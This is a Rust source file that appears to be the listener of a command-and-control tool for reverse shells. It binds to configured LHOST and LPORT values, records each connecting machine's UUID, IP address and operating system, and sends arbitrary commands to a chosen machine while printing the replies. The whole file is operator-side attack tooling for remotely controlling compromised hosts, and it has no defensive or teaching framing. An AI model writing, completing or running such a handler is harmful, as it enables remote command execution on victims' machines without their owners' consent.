extern crate tokio;

use std::borrow::Borrow;
use std::cell::Cell;
use std::error::Error;
use crate::server::HASHMAP;
use crate::shells::unix_tcp;
use tokio::net::{TcpListener, TcpSocket, TcpStream};
use tokio::net;

use std::io;
use std::ops::{Deref, Index};
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::task::JoinHandle;

#[derive(Debug)]
pub struct Connection {
    id: u16,
    uuid: String,
    ip: String,
    os: String,
    stream: TcpStream,
    alive: bool
}

impl Connection {
    pub fn get_connection(&self) -> &Connection {
        return &self;
    }
    pub fn get_uuid(&self) -> &str {
        return &self.uuid;
    }
    pub fn get_ip(&self) -> &str {
        return &self.ip;
    }
    pub fn get_os(&self) -> &str {
        return &self.os;
    }
    pub fn get_handle(&mut self) -> &mut TcpStream {
        return &mut self.stream;
    }
    pub fn get_alive(&self) -> &bool {
        return &self.alive;
    }
}

#[tokio::main]
pub async fn start() -> io::Result<()> {
    use crate::configuration::LHOST;
    use crate::configuration::LPORT;

    let ip = &LHOST;
    let connection_str = String::from(*ip) + ":" + &LPORT.to_string();

    let listener = TcpListener::bind(connection_str).await?;
    println!("Listening on tcp: {}", &listener.local_addr().unwrap());

    loop {
        let (mut stream, _) = listener.accept().await?;
        println!("Client connected to Server! IP: {}", stream.peer_addr().unwrap());
        process(stream).await.expect("TODO: panic message");
        println!("Added new connection to map!");
    }
}

pub async fn process(mut socket: TcpStream) -> io::Result<()> {
    let mut map = HASHMAP.lock().unwrap();
    let ip = String::from(&socket.peer_addr().unwrap().to_string());
    let id = (&map.keys().len() + 1) as u16;
    loop {
        let mut buf = vec![0; 4096];

        let n = socket.read(&mut buf).await.expect("Failed to read data");
        let s = String::from_utf8(buf).unwrap();

        println!("Got: {}", &s[4..n]);

        let mut split: Vec<&str> = s.split(":").collect();
        let uuid = String::from(split[0]);
        let os = String::from(split[2]);
        let mut conn =  Connection { id: *&id, uuid: String::from(&uuid[4..(uuid.len() as usize)]), os, ip, stream: socket, alive: true };

        map.insert(*&conn.id, conn);
        return Ok(());
    }
}

pub async fn send_command(id: &u16, command: String) -> io::Result<()> {
    let mut map = HASHMAP.lock().unwrap();
    let handle = map.get_mut(&id).unwrap().get_handle();

    println!("Trying to send command: {}", &command);
    match handle.try_write(&command.as_bytes()) {
        Ok(n) => {
            println!("Wrote {} bytes!", n);
            receive(id);
        }
        Err(ref e) if e.kind() == io::ErrorKind::WouldBlock => {
            println!("Failed to write to stream..");
        }
        Err(e) => {
            return Err(e.into());
        }
    }
    receive(id);

    return Ok(());
}

pub async fn receive(id: &u16) -> io::Result<()> {
    let mut buf = vec![0; 4096];

    let mut map = HASHMAP.lock().unwrap();

    map.get_mut(&id).unwrap().get_handle().read(&mut buf).await?;

    let s = String::from_utf8(buf).unwrap();

    println!("Got: {}", &s);
    return Ok(());
}